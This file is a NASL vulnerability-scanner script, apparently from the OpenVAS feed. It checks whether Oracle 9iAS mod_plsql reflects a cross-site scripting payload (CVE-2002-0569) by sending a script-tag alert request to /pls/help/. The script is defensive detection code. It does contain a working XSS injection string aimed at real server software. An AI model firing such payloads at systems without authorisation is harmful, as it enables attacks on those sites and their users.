# SPDX-FileCopyrightText: 2002 Matt Moore
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:oracle:http_server";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10853");
  script_version("2023-08-01T13:29:10+0000");
  script_tag(name:"last_modification", value:"2023-08-01 13:29:10 +0000 (Tue, 01 Aug 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2002-0569");
  script_name("Oracle 9iAS mod_plsql cross site scripting");
  script_xref(name:"URL", value:"http://www.nextgenss.com/papers/hpoas.pdf");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/4298");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2002 Matt Moore");
  script_family("Web application abuses");
  script_dependencies("gb_oracle_app_server_detect.nasl", "cross_site_scripting.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("oracle/http_server/detected");

  script_tag(name:"solution", value:"Patches which address several vulnerabilities in Oracle 9iAS can be
  downloaded from the oracle Metalink site.");

  script_tag(name:"summary", value:"The mod_plsql module supplied with Oracle9iAS allows cross site scripting
  attacks to be performed.");

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!get_app_location(cpe:CPE, port:port, nofork:TRUE))
  exit(0);

host = http_host_name( dont_add_port:TRUE );
if( http_get_has_generic_xss( port:port, host:host ) ) exit( 0 );

req = http_get(item:"/pls/help/<SCRIPT>alert(document.domain)</SCRIPT>", port:port);
soc = http_open_socket(port);
if(!soc) exit(0);

send(socket:soc, data:req);
r = http_recv(socket:soc);
http_close_socket(soc);
if( r !~ "^HTTP/1\.[01] 200" ) exit( 0 );
confirmed = string("<SCRIPT>alert(document.domain)</SCRIPT>");
confirmedtoo = string("No DAD configuration");
if((confirmed >< r) && (confirmedtoo >< r)) security_message(port);
